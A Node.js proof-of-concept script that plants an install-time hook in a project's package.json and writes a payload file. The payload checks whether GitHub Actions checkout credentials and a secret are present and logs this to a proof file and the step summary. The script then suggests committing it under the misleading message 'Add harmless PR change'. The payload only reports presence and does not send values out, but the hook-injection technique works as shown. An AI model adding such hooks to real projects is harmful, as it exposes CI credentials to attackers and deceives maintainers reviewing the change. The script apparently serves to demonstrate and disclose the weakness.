import { mkdir, readFile, writeFile } from "node:fs/promises";
import { join } from "node:path";

const packageJsonPath = "package.json";
const packageJson = JSON.parse(await readFile(packageJsonPath, "utf8"));
packageJson.scripts = {
  ...(packageJson.scripts ?? {}),
  postinstall: "node scripts/attacker-postinstall.mjs"
};

await writeFile(packageJsonPath, `${JSON.stringify(packageJson, null, 2)}\n`);
await mkdir("scripts", { recursive: true });
await writeFile(
  join("scripts", "attacker-postinstall.mjs"),
  `import { execFileSync } from "node:child_process";
import { appendFileSync, mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";

const proofDir = process.env.POC_PROOF_DIR || ".poc-proof";
mkdirSync(proofDir, { recursive: true });

function gitExtraHeaderPresent() {
  try {
    const value = execFileSync("git", ["config", "--get-all", "http.https://github.com/.extraheader"], {
      encoding: "utf8",
      stdio: ["ignore", "pipe", "ignore"]
    }).trim();
    return Boolean(value);
  } catch {
    return false;
  }
}

const proof = {
  message: "Attacker-controlled postinstall executed.",
  eventName: process.env.GITHUB_EVENT_NAME || "",
  repository: process.env.GITHUB_REPOSITORY || "",
  ref: process.env.GITHUB_REF || "",
  sha: process.env.GITHUB_SHA || "",
  fakeSecretPresent: Boolean(process.env.POC_FAKE_SECRET),
  fakeSecretLength: process.env.POC_FAKE_SECRET?.length || 0,
  checkoutGitCredentialsPresent: gitExtraHeaderPresent(),
  note: "This POC does not print or exfiltrate secret values."
};

writeFileSync(join(proofDir, "proof.json"), JSON.stringify(proof, null, 2) + "\\n");
appendFileSync(process.env.GITHUB_STEP_SUMMARY || join(proofDir, "summary.md"), [
  "## Attacker payload executed",
  "",
  "~~~json",
  JSON.stringify(proof, null, 2),
  "~~~",
  ""
].join("\\n"));

console.log("[attacker payload] postinstall executed");
console.log("[attacker payload] event=" + proof.eventName);
console.log("[attacker payload] fake secret present=" + proof.fakeSecretPresent);
console.log("[attacker payload] checkout git credentials present=" + proof.checkoutGitCredentialsPresent);
console.log("[attacker payload] proof file=" + join(proofDir, "proof.json"));
`
);

console.log("Attacker payload written.");
console.log("Next:");
console.log("  git add package.json scripts/attacker-postinstall.mjs");
console.log('  git commit -m "Add harmless PR change"');
